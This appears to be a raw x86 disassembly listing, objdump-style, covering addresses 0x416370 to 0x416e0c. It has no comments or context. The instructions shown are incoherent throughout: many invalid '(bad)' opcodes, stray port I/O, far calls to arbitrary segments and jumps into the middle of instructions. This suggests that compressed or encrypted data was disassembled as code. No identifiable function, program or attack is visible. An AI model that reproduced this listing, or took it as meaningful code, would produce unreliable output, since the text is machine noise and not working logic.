  416370:	add    DWORD PTR [ebx+0x6cf39679],eax
  416376:	out    dx,al
  416377:	js     0x4163c2
  416379:	dec    esp
  41637a:	push   ds
  41637b:	in     eax,dx
  41637c:	add    BYTE PTR [ebx+0x1983eba1],0x87
  416383:	fwait
  416384:	push   esp
  416385:	out    dx,eax
  416386:	cmp    BYTE PTR [edi-0x55679afa],0x25
  41638d:	mov    al,0x89
  41638f:	xchg   esi,eax
  416390:	xchg   esp,eax
  416391:	jecxz  0x4163d6
  416393:	(bad)  [ebp-0x32f8c1a2]
  416399:	leave  
  41639a:	inc    esp
  41639b:	sbb    eax,0x7fec9c51
  4163a0:	call   0xacfa426a
  4163a5:	mov    ecx,0x21de221b
  4163aa:	jg     0x4163f5
  4163ac:	in     eax,0x48
  4163ae:	aas    
  4163af:	mov    ch,0x1
  4163b1:	push   0xb
  4163b3:	mov    edx,DWORD PTR [ebp+0x3a]
  4163b6:	and    eax,0xa5c61bd2
  4163bb:	loop   0x4163f5
  4163bd:	sbb    bh,BYTE PTR ds:0xbc871acc
  4163c3:	(bad)  
  4163c4:	rcr    BYTE PTR [eax],1
  4163c6:	xor    eax,0x3835d81d
  4163cb:	cmp    eax,0xb019aee3
  4163d0:	fdiv   st,st(5)
  4163d2:	adc    bh,BYTE PTR [eax]
  4163d4:	ret    0x12c8
  4163d7:	lods   al,BYTE PTR ds:[esi]
  4163d8:	pop    edi
  4163d9:	outs   dx,DWORD PTR ds:[esi]
  4163da:	and    ebx,DWORD PTR [edi]
  4163dc:	test   BYTE PTR [edx-0x768a73b3],bh
  4163e2:	fwait
  4163e3:	adc    eax,0xc91c9ec8
  4163e8:	fdivr  QWORD PTR [edi-0x6159e944]
  4163ee:	pop    esp
  4163ef:	push   0xffffffdf
  4163f1:	ja     0x4163a9
  4163f3:	je     0x41643a
  4163f5:	mov    bl,0xde
  4163f7:	ja     0x416399
  4163f9:	iret   
  4163fa:	repz daa 
  4163fc:	xor    esi,DWORD PTR [edx]
  4163fe:	ss imul edx
  416401:	and    DWORD PTR [eax],ebp
  416403:	jecxz  0x416420
  416405:	(bad)  
  416407:	imul   ecx,DWORD PTR [ecx-0x11],0xede96c7e
  41640e:	cmp    eax,0xd0
	...
  416473:	add    bl,dh
  416475:	inc    ebx
  416476:	ror    cl,1
  416478:	lock (bad) 
  41647b:	jnp    0x41640b
  41647d:	xor    al,0x5a
  41647f:	xchg   esi,eax
  416480:	push   ss
  416481:	les    edi,FWORD PTR [ebx+0x23]
  416484:	inc    eax
  416485:	jmp    0x416487
  416487:	add    BYTE PTR [ecx+eax*1],al
  41648a:	add    BYTE PTR [eax],al
  41648c:	jecxz  0x41647d
  41648e:	inc    edi
  41648f:	sbb    al,dl
  416491:	pop    ebx
  416492:	sbb    al,0xb5
  416494:	rcl    DWORD PTR [edi-0x740fa34c],cl
  41649a:	repz and ecx,ecx
  41649d:	cwde   
  41649e:	lahf   
  41649f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4164a0:	dec    DWORD PTR [ebx-0x43]
  4164a3:	leave  
  4164a4:	pop    edi
  4164a5:	jb     0x4164c0
  4164a7:	fsub   QWORD PTR [esi-0x56]
  4164aa:	push   ss
  4164ab:	or     al,0x41
  4164ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164ae:	mov    ah,0x4f
  4164b0:	push   edx
  4164b1:	cmp    ecx,DWORD PTR [esp+edx*1-0x42910fc9]
  4164b8:	dec    esi
  4164b9:	ins    BYTE PTR es:[edi],dx
  4164ba:	push   ds
  4164bb:	rol    cl,1
  4164bd:	aad    0xa3
  4164bf:	pop    es
  4164c0:	adc    al,0x4e
  4164c2:	rol    BYTE PTR [eax],cl
  4164c4:	mov    ecx,0x29665b5c
  4164c9:	pop    ecx
  4164ca:	outs   dx,BYTE PTR ds:[esi]
  4164cb:	dec    edi
  4164cc:	and    al,0x17
  4164ce:	jae    0x41653a
  4164d0:	bound  edi,QWORD PTR [edx]
  4164d2:	shr    BYTE PTR ds:[edi+0xeca85ce],cl
  4164d9:	or     ah,BYTE PTR [ebx]
  4164db:	or     eax,0xc3f33cbc
  4164e0:	add    cl,BYTE PTR [esi-0x32]
  4164e3:	js     0x41652b
  4164e5:	jp     0x41651e
  4164e7:	dec    esp
  4164e8:	je     0x41649e
  4164ea:	xor    ecx,DWORD PTR [esi+0x4f0faa3e]
  4164f0:	xor    ebx,DWORD PTR [ebx]
  4164f2:	dec    ecx
  4164f3:	popa   
  4164f4:	or     bl,ah
  4164f6:	mov    al,0x1e
  4164f8:	retf   
  4164f9:	xchg   edi,eax
  4164fa:	js     0x41650e
  4164fc:	je     0x416506
  4164fe:	inc    edi
  4164ff:	push   edx
  416500:	int3   
  416501:	sub    eax,0xabf5af39
  416506:	fidivr DWORD PTR [esi-0x6c]
  416509:	xor    al,0x44
  41650b:	push   ecx
  41650c:	xchg   esi,eax
  41650d:	lods   eax,DWORD PTR ds:[esi]
  41650e:	adc    ecx,0x61
  416511:	jp     0x41657e
  416513:	cld    
  416514:	add    bl,BYTE PTR [edi]
  416516:	pop    ss
  416517:	push   esp
  416518:	in     eax,0x6d
  41651a:	dec    esp
  41651b:	push   ds
  41651c:	stc    
  41651d:	mov    bl,0x18
  41651f:	test   DWORD PTR [eax],edx
  416521:	in     al,0x6f
  416523:	cmp    al,0xbc
  416525:	out    dx,al
  416526:	cmp    ecx,DWORD PTR ds:0x136c1185
  41652c:	fld    TBYTE PTR [esi-0x26]
  41652f:	and    DWORD PTR [bx],ecx
  416532:	or     BYTE PTR [edx+0x44],bh
  416535:	inc    ecx
  416536:	inc    ebx
  416537:	fist   DWORD PTR [edi+ebp*8-0x50590eef]
  41653e:	xchg   BYTE PTR [si+0x7c6d],bh
  416543:	push   ebp
  416544:	or     dh,0x5f
  416547:	xlat   BYTE PTR ds:[ebx]
  416548:	fldcw  WORD PTR [ebx-0x2351ae7d]
  41654e:	or     eax,DWORD PTR [eax-0x62]
  416551:	(bad)
  416556:	enter  0x3e87,0x12
  41655a:	in     al,dx
  41655b:	lss    eax,FWORD PTR [ebp+0x46]
  41655f:	mov    esp,0x21fbb146
  416564:	mov    dh,0x8d
  416566:	adc    esi,DWORD PTR [ebx-0x49]
  416569:	pusha  
  41656a:	setge  BYTE PTR [eax-0x50]
  41656e:	(bad)  
  41656f:	jmp    0x5777e55f
  416574:	pop    ebp
  416575:	cs int 0x8
  416578:	cmp    eax,0xe9239ca8
  41657d:	cmp    BYTE PTR [edi+eiz*2+0x3b],al
  416581:	xor    cl,dl
  416583:	rcl    edi,1
  416585:	ret    
  416586:	xor    edx,DWORD PTR [ecx-0x1258861f]
  41658c:	test   eax,0x9d91c7
	...
  4165f1:	add    BYTE PTR [eax],al
  4165f3:	add    BYTE PTR ds:0xfff32bd8,ah
  4165f9:	repz std 
  4165fb:	fisub  WORD PTR [esi+0x294fbcac]
  416601:	nop
  416602:	inc    edx
  416603:	mov    bh,0x44
  416605:	in     al,dx
  416606:	add    BYTE PTR [eax],al
  416608:	add    al,0x1
  41660a:	add    BYTE PTR [eax],al
  41660c:	or     eax,0x4172ae1f
  416611:	in     al,dx
  416612:	mov    dh,0x3c
  416614:	mov    ah,0xc1
  416616:	test   eax,0xabc72163
  41661b:	nop
  41661c:	fcom   QWORD PTR [ebx+0x5f9e466]
  416622:	cwde   
  416623:	mov    eax,0xec7937a2
  416628:	mov    eax,0x7053d190
  41662d:	add    DWORD PTR [edi-0x34],esi
  416630:	imul   ecx,DWORD PTR [ebx],0x2c064d6e
  416636:	ret    0xceff
  416639:	jns    0x4165c5
  41663b:	(bad)  
  41663c:	repnz ror DWORD PTR [esi],0xed
  416640:	iret   
  416641:	xchg   ebx,eax
  416642:	and    esp,esp
  416644:	ss ret 0x8a7b
  416648:	cmp    eax,0x4c893cea
  41664d:	sbb    dh,BYTE PTR [edx+0x46b395e4]
  416653:	xchg   BYTE PTR [ecx],ch
  416655:	lock in al,dx
  416657:	mov    eax,DWORD PTR [esi+eiz*8]
  41665a:	ret    0xa691
  41665d:	sub    edi,DWORD PTR [eax]
  41665f:	pop    esi
  416660:	mov    eax,0x10a7da5f
  416665:	fistp  QWORD PTR [edi-0x2a]
  416668:	push   ss
  416669:	xchg   edx,eax
  41666a:	sbb    ah,dh
  41666c:	arpl   WORD PTR [esi],ax
  41666e:	push   ss
  41666f:	push   ecx
  416670:	not    BYTE PTR [edi+0x14]
  416673:	inc    edx
  416674:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416675:	hlt    
  416676:	adc    al,BYTE PTR ss:[ebx+edx*8]
  41667a:	ret    
  41667b:	in     al,0x66
  41667d:	cmp    ch,BYTE PTR [edx-0x1fa680d3]
  416683:	mov    ecx,0xdaf70be7
  416688:	mov    esi,DWORD PTR [eax+0x71]
  41668b:	pop    es
  41668c:	out    dx,al
  41668d:	outs   dx,DWORD PTR ds:[esi]
  41668e:	or     cl,BYTE PTR [edx-0x71796163]
  416694:	or     bh,BYTE PTR [ebx+0x5da575fe]
  41669a:	mov    esp,0x199221b3
  41669f:	push   ds
  4166a0:	jl     0x416627
  4166a2:	ss mov al,0x73
  4166a5:	adc    DWORD PTR [ebp-0x5cd4b83d],0x5c
  4166ac:	ror    bl,1
  4166ae:	and    ah,ah
  4166b0:	int3   
  4166b1:	inc    esp
  4166b2:	mov    dh,0xbf
  4166b4:	enter  0x545a,0xfa
  4166b8:	jns    0x4166c0
  4166ba:	(bad)  
  4166bb:	jno    0x4166ef
  4166bd:	jge    0x4166b8
  4166bf:	arpl   WORD PTR ds:0xd23d9ce,sp
  4166c5:	and    BYTE PTR [edi+0x23f2affb],dl
  4166cb:	iret   
  4166cc:	pop    edx
  4166cd:	mov    ds:0x8cab397f,al
  4166d2:	mov    ebp,0xe164abe3
  4166d7:	cld    
  4166d8:	(bad)  
  4166d9:	sahf   
  4166da:	fmul   QWORD PTR [ecx+0x3a]
  4166dd:	xor    eax,0x3deee23b
  4166e2:	mov    ds,edi
  4166e4:	popa   
  4166e5:	mov    ds:0x25521d36,al
  4166ea:	jmp    0x9d2fddaa
  4166ef:	adc    bh,BYTE PTR ds:0xd00aec8c
  4166f5:	inc    ebp
  4166f6:	jge    0x41669c
  4166f8:	(bad)  
  4166f9:	mov    bl,0xb0
  4166fb:	mov    bh,bl
  4166fd:	test   DWORD PTR [esi-0x2aeed72a],ebp
  416703:	fld    QWORD PTR [esi-0x62b76bcd]
  416709:	clc    
  41670a:	(bad)  
  41670b:	pusha  
  41670c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41670d:	ds dec ebx
  41670f:	and    eax,DWORD PTR [eax]
	...
  416771:	add    BYTE PTR [eax],al
  416773:	add    ah,al
  416775:	(bad)  
  416777:	(bad)  
  416778:	(bad)  
  41677a:	out    0xff,eax
  41677c:	sbb    edi,DWORD PTR [esp+ecx*2-0x3a]
  416780:	popa   
  416781:	fadd   DWORD PTR [eax+0xed4827]
  416787:	add    BYTE PTR [ecx+eax*1],al
  41678a:	add    BYTE PTR [eax],al
  41678c:	inc    edx
  41678d:	rol    DWORD PTR [ecx+0x509710d5],cl
  416793:	test   eax,0x25bd94b
  416798:	inc    esp
  416799:	mov    bh,0x6e
  41679b:	jp     0x416802
  41679d:	int    0x4b
  41679f:	or     eax,0xac193112
  4167a4:	jl     0x4167d3
  4167a6:	inc    ecx
  4167a7:	mov    esp,0xf272bea5
  4167ac:	pop    ss
  4167ad:	call   0x17b9:0xdb4533e3
  4167b4:	mov    cl,0x96
  4167b6:	push   edx
  4167b7:	mov    BYTE PTR [ecx+eax*1+0x4e52552e],dh
  4167be:	or     al,0xca
  4167c0:	xchg   esp,eax
  4167c1:	mov    cl,0x20
  4167c3:	mov    ds:0x2bd023d9,al
  4167c8:	aas    
  4167c9:	outs   dx,BYTE PTR ds:[esi]
  4167ca:	sbb    eax,DWORD PTR [ecx]
  4167cc:	ds in  al,0xdc
  4167cf:	test   BYTE PTR [ebp+0x5d],al
  4167d2:	arpl   bp,si
  4167d4:	das    
  4167d5:	loop   0x4167c2
  4167d7:	push   es
  4167d8:	or     BYTE PTR [eax+0x1cd7ce2c],dh
  4167de:	lahf   
  4167df:	sbb    al,0x33
  4167e1:	cmp    bl,BYTE PTR [esi+0x1a]
  4167e4:	push   0xffffffa0
  4167e6:	repz or al,0xd4
  4167e9:	das    
  4167ea:	cs jl  0x416803
  4167ed:	mov    dl,0x7f
  4167ef:	sub    DWORD PTR [esi+edx*4+0xe9bb559],esi
  4167f6:	shr    al,0x36
  4167f9:	fsubr  DWORD PTR [eax+0x6e]
  4167fc:	ins    DWORD PTR es:[edi],dx
  4167fd:	into   
  4167fe:	daa    
  4167ff:	addr16 lahf 
  416801:	adc    BYTE PTR [ecx],0x73
  416804:	cdq    
  416805:	stc    
  416806:	aad    0xeb
  416808:	push   0x18
  41680a:	gs stos DWORD PTR es:[edi],eax
  41680c:	jmp    0x4d10:0x9a0fc522
  416813:	dec    edx
  416815:	test   DWORD PTR [eax],eax
  416817:	clc    
  416818:	mov    ah,0xf8
  41681a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41681b:	pop    esi
  41681c:	sub    ah,ah
  41681e:	je     0x416853
  416820:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416821:	call   0xce7de315
  416826:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416827:	(bad)  
  416828:	aad    0x66
  41682a:	pop    ebp
  41682b:	xchg   bh,al
  41682d:	ret    0x85ae
  416830:	mov    al,dl
  416832:	adc    bl,bh
  416834:	cmp    DWORD PTR [ebp+0xe],0xe786a1ad
  41683b:	fisubr DWORD PTR [edx+0x21fa1f90]
  416841:	push   ds
  416842:	adc    edi,DWORD PTR [eax-0x3e92533f]
  416848:	sbb    esp,DWORD PTR [ebx+ebp*2]
  41684b:	push   es
  41684c:	ins    BYTE PTR es:[edi],dx
  41684d:	mov    esp,0x71bf102e
  416852:	sbb    BYTE PTR [edi-0x6c14bd3],cl
  416858:	or     eax,0x825ede2
  41685d:	add    BYTE PTR [edx+0x23],0x13
  416861:	call   0x3e610d1d
  416866:	sub    esi,edi
  416868:	stos   DWORD PTR es:[edi],eax
  416869:	sub    edi,DWORD PTR [esi+0x2d]
  41686c:	imul   eax,DWORD PTR [ebx+0x21],0x6d
  416870:	mov    ebx,0x3ebfeb9d
  416875:	mov    cl,0xc9
  416877:	xchg   ebx,eax
  416878:	sub    esp,edx
  41687a:	lahf   
  41687b:	out    0x8e,eax
  41687d:	call   0x7874:0x3a236a40
  416884:	sbb    eax,0x3bd93c41
  416889:	mov    esi,0x1409f35e
  41688e:	sar    DWORD PTR [eax+0x0],cl
	...
  4168f1:	add    BYTE PTR [eax],al
  4168f3:	add    cl,dl
  4168f5:	scas   eax,DWORD PTR es:[edi]
  4168f6:	push   es
  4168f7:	repz jle 0x4168f5
  4168fa:	cmc    
  4168fb:	scas   eax,DWORD PTR es:[edi]
  4168fc:	sub    DWORD PTR [edi-0x5d],edi
  4168ff:	mov    ebp,0x43b087a5
  416904:	dec    esp
  416905:	out    dx,al
  416906:	add    BYTE PTR [eax],al
  416908:	add    al,0x1
  41690a:	add    BYTE PTR [eax],al
  41690c:	sub    BYTE PTR [eax],bh
  41690e:	mov    ah,0xc5
  416910:	das    
  416911:	cmp    ah,BYTE PTR [esp+eax*4-0xc]
  416915:	fild   QWORD PTR ds:0xbba2443b
  41691b:	popa   
  41691c:	sbb    dl,dl
  41691e:	pop    edx
  41691f:	push   esp
  416920:	inc    edx
  416921:	mov    al,ds:0x78b3e156
  416926:	jp     0xe544fa7
  41692c:	mov    al,ds:0x72e2282a
  416931:	add    eax,0x23412374
  416936:	test   DWORD PTR [esi-0x1d8cd104],ebx
  41693c:	dec    ecx
  41693d:	cdq    
  41693e:	stos   BYTE PTR es:[edi],al
  41693f:	dec    edx
  416940:	sbb    al,0xf8
  416942:	fst    DWORD PTR [esi+0x5d]
  416945:	ins    BYTE PTR es:[edi],dx
  416946:	int3   
  416947:	fdiv   QWORD PTR [edx+0x269f9326]
  41694d:	ja     0x416914
  41694f:	mov    edx,0x76028016
  416954:	jg     0x41693d
  416956:	leave  
  416957:	leave  
  416958:	stc    
  416959:	mov    WORD PTR [esp+ebp*4+0x33],ss
  41695d:	in     al,0x34
  41695f:	ret    
  416960:	sahf   
  416961:	sar    DWORD PTR [ecx],1
  416963:	push   esp
  416964:	in     al,dx
  416965:	in     eax,0x78
  416967:	mov    ecx,0xa24afd1f
  41696c:	sub    eax,0xf2b864d4
  416971:	pushf  
  416972:	ins    BYTE PTR es:[edi],dx
  416973:	retf   0x7aa
  416976:	mov    BYTE PTR [edi+0x55],ch
  416979:	fnstcw WORD PTR [esi]
  41697b:	jl     0x4169cb
  41697d:	es dec esp
  41697f:	dec    esp
  416980:	test   esi,ebx
  416982:	fbld   TBYTE PTR [esi]
  416984:	(bad)  
  416985:	sahf   
  416986:	imul   esp,DWORD PTR [edi-0x3b],0x26
  41698a:	jmp    0xe72cee49
  41698f:	push   0x63c89ff4
  416994:	and    BYTE PTR [ebp+ecx*1+0x79],cl
  416998:	scas   eax,DWORD PTR es:[edi]
  416999:	dec    edx
  41699a:	in     eax,dx
  41699b:	sub    DWORD PTR [eax+0x59],eax
  41699e:	sub    eax,0x7a473e65
  4169a3:	adc    cl,BYTE PTR [esi-0x15cfae03]
  4169a9:	sbb    eax,0xce3b3450
  4169ae:	cmp    DWORD PTR [esp+eiz*2-0x47],esp
  4169b2:	xor    al,0x56
  4169b4:	test   DWORD PTR [edx-0x2984b0e0],0x9551134f
  4169be:	ins    BYTE PTR es:[edi],dx
  4169bf:	add    al,0xf0
  4169c1:	add    BYTE PTR [ebx-0x6b162500],0xb9
  4169c8:	adc    al,0xe
  4169ca:	lds    ecx,FWORD PTR [esi+0x1ae66b38]
  4169d0:	jg     0x4169e7
  4169d2:	es xor ah,al
  4169d5:	out    0xad,eax
  4169d7:	add    ch,dl
  4169d9:	in     eax,0xe6
  4169db:	rol    BYTE PTR gs:[ebp+eax*4+0x42d82620],cl
  4169e3:	scas   al,BYTE PTR es:[edi]
  4169e4:	jg     0x416a27
  4169e6:	mov    cl,0x13
  4169e8:	xlat   BYTE PTR ds:[ebx]
  4169e9:	mov    al,0x1
  4169eb:	or     DWORD PTR ss:[ebx+0x672c9ee1],ebx
  4169f2:	dec    edi
  4169f3:	(bad)  
  4169f4:	popf   
  4169f5:	je     0x4169b2
  4169f7:	(bad)  
  4169f8:	iret   
  4169f9:	pusha  
  4169fa:	sbb    bl,BYTE PTR ds:0xd150bb08
  416a00:	pop    eax
  416a01:	mov    ebx,0xc56254f2
  416a06:	jnp    0x4169b8
  416a08:	loop   0x4169c5
  416a0a:	xchg   ecx,eax
  416a0b:	ficomp DWORD PTR [ecx+0xe753af]
	...
  416a71:	add    BYTE PTR [eax],al
  416a73:	add    bl,cl
  416a75:	pusha  
  416a76:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416a7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a7d:	mov    al,ds:0xb8e0ba3
  416a82:	mov    ecx,0xef505c
  416a87:	add    BYTE PTR [ecx+eax*1],al
  416a8a:	add    BYTE PTR [eax],al
  416a8c:	addr16 cmc 
  416a8e:	mov    dl,0x95
  416a90:	add    DWORD PTR [ebx-0x7964d614],edi
  416a96:	test   bl,bl
  416a98:	in     al,dx
  416a99:	scas   eax,DWORD PTR es:[edi]
  416a9a:	xor    BYTE PTR [eax-0x45830c89],0x1f
  416aa1:	xchg   ecx,eax
  416aa2:	imul   ecx,DWORD PTR [edx+0x58],0xffffffa5
  416aa6:	addr16 jp 0x416ad1
  416aa9:	and    cl,al
  416aab:	xor    ebx,DWORD PTR [edx+0x23]
  416aae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416aaf:	mov    eax,0x9b200803
  416ab4:	push   es
  416ab5:	pop    esi
  416ab6:	imul   eax,DWORD PTR ds:[edi],0xffffffde
  416aba:	adc    eax,0xd9d8f752
  416abf:	adc    ah,ch
  416ac1:	sbb    DWORD PTR [eax+0x63],ebx
  416ac4:	(bad)  
  416ac5:	ins    BYTE PTR es:[edi],dx
  416ac6:	call   0x63c3e5a9
  416acb:	xor    dh,BYTE PTR [edx-0x24]
  416ace:	add    eax,0xecb6eb1e
  416ad3:	pusha  
  416ad4:	mov    cs,WORD PTR [edx+0x50b31172]
  416ada:	frstor [edx-0x4c]
  416add:	and    DWORD PTR [edx+ebp*8],0xffffffab
  416ae1:	fidivr DWORD PTR [eax+0x7090eed8]
  416ae7:	push   es
  416ae8:	xlat   BYTE PTR ds:[ebx]
  416ae9:	outs   dx,DWORD PTR ds:[esi]
  416aea:	dec    eax
  416aeb:	frstor [edx+esi*2+0x47151ab4]
  416af2:	repz cmc 
  416af4:	idiv   ebx
  416af6:	addr16 push es
  416af8:	cmc    
  416af9:	(bad)  
  416afa:	push   edi
  416afc:	clc    
  416afd:	pop    ebx
  416afe:	and    BYTE PTR [ebp-0x739654e],dh
  416b04:	jecxz  0x416ab4
  416b06:	or     DWORD PTR gs:[ebp+eiz*1+0x559c9df9],esi
  416b0e:	ret    0xede4
  416b11:	fwait
  416b12:	call   0xdd58:0x22176d1d
  416b19:	daa    
  416b1a:	pop    edx
  416b1b:	xchg   edx,eax
  416b1c:	mov    ah,BYTE PTR [eax]
  416b1e:	jg     0x416ab8
  416b20:	push   cs
  416b21:	cdq    
  416b22:	ds gs pop eax
  416b25:	cmp    eax,0x55b22d4c
  416b2a:	mov    ecx,0x49e4cedc
  416b2f:	fidiv  WORD PTR [ebx]
  416b31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b32:	mov    cl,0xd1
  416b34:	add    esp,ebx
  416b36:	push   0xff708da
  416b3b:	dec    edi
  416b3c:	ja     0x416bb6
  416b3e:	push   eax
  416b3f:	popf   
  416b40:	(bad)  
  416b41:	inc    eax
  416b42:	ret    
  416b43:	ins    BYTE PTR es:[edi],dx
  416b44:	pop    ecx
  416b45:	cld    
  416b46:	mov    ah,0xd3
  416b48:	and    eax,0x5477d3f8
  416b4d:	aad    0xfc
  416b4f:	jnp    0x416bc6
  416b51:	push   ss
  416b52:	jg     0x416adf
  416b54:	push   0x771bd1f4
  416b59:	push   ebx
  416b5a:	stos   DWORD PTR es:[edi],eax
  416b5b:	cli    
  416b5c:	loop   0x416b9d
  416b5e:	dec    ebx
  416b5f:	loopne 0x416b3d
  416b61:	jne    0x416aeb
  416b63:	pop    edi
  416b64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b65:	jmp    0x416b82
  416b67:	fisub  DWORD PTR [edx+0xdd8fd2c]
  416b6d:	pushf  
  416b6e:	sub    cl,BYTE PTR [esi]
  416b70:	jo     0x416b60
  416b72:	xor    al,0xdf
  416b74:	push   0x6e
  416b76:	sar    bl,cl
  416b78:	xchg   edx,eax
  416b79:	jmp    0x416bb2
  416b7b:	pop    eax
  416b7c:	mov    bh,ah
  416b7e:	jmp    FWORD PTR [eax-0x11]
  416b81:	fist   WORD PTR [ebp+0x70cd5afb]
  416b87:	push   0xdf72d33c
  416b8c:	adc    eax,edx
  416b8e:	adc    BYTE PTR [esi],al
	...
  416bf4:	jecxz  0x416c5b
  416bf6:	push   cs
  416bf7:	test   DWORD PTR [esi-0x38a0401],0xf35b70a9
  416c01:	call   0xf095b5b9
  416c06:	add    BYTE PTR [eax],al
  416c08:	add    al,0x1
  416c0a:	add    BYTE PTR [eax],al
  416c0c:	or     DWORD PTR [ebx-0xf],esi
  416c0f:	cmp    DWORD PTR [ecx+eiz*8-0x555d7017],ebp
  416c16:	cmp    ebx,DWORD PTR [ebx+0x59ef1fa4]
  416c1c:	ficom  DWORD PTR [esi+0x3724d61b]
  416c22:	loop   0x416c7e
  416c24:	repnz retf 0x9b96
  416c28:	push   edx
  416c29:	aad    0xd7
  416c2b:	push   eax
  416c2c:	ins    DWORD PTR es:[edi],dx
  416c2d:	mov    esi,edx
  416c2f:	(bad)  
  416c30:	mov    WORD PTR [ebx-0x26],ss
  416c33:	inc    edx
  416c34:	push   ds
  416c35:	out    0xda,al
  416c37:	popf   
  416c38:	xchg   esi,eax
  416c39:	test   al,0x9
  416c3b:	adc    eax,0x7121cc11
  416c40:	lock out dx,al
  416c42:	pop    es
  416c43:	or     al,0xe5
  416c45:	scas   eax,DWORD PTR es:[edi]
  416c46:	pop    ebx
  416c47:	xlat   BYTE PTR ds:[ebx]
  416c48:	dec    ebx
  416c49:	xchg   edx,eax
  416c4a:	mov    esp,0xfb9c43b7
  416c4f:	jle    0x416c6b
  416c51:	push   es
  416c52:	ja     0x416c2d
  416c54:	lock adc al,bh
  416c57:	lods   al,BYTE PTR ds:[esi]
  416c58:	xor    BYTE PTR [esi-0x66],0x8a
  416c5c:	mov    ecx,0x166b5001
  416c61:	shl    edx,0x7f
  416c64:	dec    ebx
  416c65:	pushf  
  416c66:	loopne 0x416c2b
  416c68:	sbb    al,0x85
  416c6b:	test   DWORD PTR [ebx],ebp
  416c6d:	mov    ds:0x6e4d57d0,eax
  416c72:	pop    esp
  416c73:	mov    DWORD PTR [edi],ecx
  416c75:	or     DWORD PTR [ebx+0x508ac83d],ecx
  416c7b:	int    0x78
  416c7d:	inc    eax
  416c7e:	sub    DWORD PTR [edi+0x78d6d0f],ebx
  416c84:	fnstsw WORD PTR [ebx+0x39b9e402]
  416c8a:	fcomp  QWORD PTR [edx]
  416c8c:	int    0x93
  416c8e:	aad    0x98
  416c90:	push   eax
  416c91:	cmp    DWORD PTR [esi+0x2f0c428b],ecx
  416c97:	add    ah,cl
  416c99:	mov    ?,WORD PTR [ebx+0x1f]
  416c9c:	retf   0x6244
  416c9f:	cld    
  416ca0:	and    al,0x66
  416ca2:	jbe    0x416c72
  416ca4:	xchg   DWORD PTR [ebx-0x67c16e28],esi
  416caa:	pop    esi
  416cab:	push   ss
  416cac:	retf   0xd89b
  416caf:	adc    al,0x14
  416cb1:	repnz add al,BYTE PTR [edi*1-0x3c75e986]
  416cb9:	lds    ebp,FWORD PTR [ecx+ebx*4]
  416cbc:	push   esi
  416cbd:	lea    edi,[edi+0x33]
  416cc0:	jno    0x416c44
  416cc2:	push   eax
  416cc3:	xor    eax,0x3f68f605
  416cc8:	repz int3 
  416cca:	retf   
  416ccb:	xor    eax,0x9938c68a
  416cd0:	inc    esi
  416cd1:	jp     0x416c7f
  416cd3:	push   0xffffffe5
  416cd5:	(bad)  
  416cd6:	xlat   BYTE PTR ds:[ebx]
  416cd7:	mov    ebp,DWORD PTR [eax]
  416cd9:	es sti 
  416cdb:	int3   
  416cdc:	aaa    
  416cdd:	cmp    al,0x5f
  416cdf:	out    0x1e,al
  416ce1:	mov    dl,0xb6
  416ce3:	inc    esi
  416ce4:	(bad)
  416ce7:	icebp  
  416ce8:	push   ecx
  416ce9:	xchg   ebx,eax
  416cea:	fld    DWORD PTR [esi-0x24]
  416ced:	out    dx,eax
  416cee:	push   ebx
  416cef:	iret   
  416cf0:	into   
  416cf1:	push   esp
  416cf2:	call   0x1158:0x40dfa963
  416cf9:	add    ah,bl
  416cfb:	aas    
  416cfc:	enter  0x1078,0x96
  416d00:	daa    
  416d01:	in     eax,dx
  416d02:	mov    ah,0x6b
  416d04:	push   ecx
  416d05:	addr16 push ebp
  416d07:	mov    eax,ds:0xbeac3c61
  416d0c:	jg     0x416cd4
  416d0e:	mov    ecx,DWORD PTR [esi+0x0]
	...
  416d74:	and    DWORD PTR [ebx-0x40445077],edx
  416d7a:	daa    
  416d7b:	lahf   
  416d7c:	mov    ch,0x99
  416d7e:	pop    edx
  416d7f:	das    
  416d80:	jmp    0x58439ad2
  416d85:	icebp  
  416d86:	add    BYTE PTR [eax],al
  416d88:	add    al,0x1
  416d8a:	add    BYTE PTR [eax],al
  416d8c:	addr16 mov ebx,0x689cbb51
  416d92:	aad    0xd0
  416d94:	add    esp,edx
  416d96:	sbb    eax,0xc9519a94
  416d9b:	ror    BYTE PTR [ebx],0xd4
  416d9e:	push   ebp
  416d9f:	mov    BYTE PTR [edx],ah
  416da1:	das    
  416da2:	rol    BYTE PTR [ebx+0x55c55d2c],1
  416da8:	inc    edx
  416da9:	and    ah,0xd0
  416dac:	shr    BYTE PTR [edx+edi*4],1
  416daf:	cli    
  416db0:	mov    ecx,0xca6889a1
  416db5:	dec    esi
  416db6:	pop    edi
  416db7:	cmp    dh,cl
  416db9:	mov    edi,0x89ec4cef
  416dbe:	stos   DWORD PTR es:[edi],eax
  416dbf:	xchg   BYTE PTR [ecx+0xfb08d40],dh
  416dc5:	cmc    
  416dc6:	es push esp
  416dc8:	aam    0x83
  416dca:	mov    al,ds:0x2807a9b9
  416dcf:	cmp    al,bl
  416dd1:	mov    esp,0x2f663492
  416dd6:	retf   0xeefe
  416dd9:	adc    BYTE PTR [edi+0x14],0xa4
  416ddd:	out    0xa3,al
  416ddf:	(bad)  
  416de0:	into   
  416de1:	shl    DWORD PTR es:[ecx],0x1b
  416de5:	jle    0x416dae
  416de7:	push   ebp
  416de8:	mov    gs,esp
  416dea:	rcl    BYTE PTR [edi+edi*4],1
  416ded:	push   esp
  416dee:	inc    dl
  416df0:	xor    BYTE PTR [esi-0x3847b43e],0x57
  416df7:	xor    al,0x7f
  416df9:	inc    esi
  416dfa:	outs   dx,BYTE PTR ds:[esi]
  416dfb:	sbb    ch,BYTE PTR [edi+0x2468b0d8]
  416e01:	ja     0x416daa
  416e03:	sbb    ch,al
  416e05:	lods   eax,DWORD PTR ds:[esi]
  416e06:	dec    ebx
  416e07:	xchg   DWORD PTR [edx-0x16],ebx
  416e0a:	cmp    al,0x18
  416e0c:	ret    0xee45
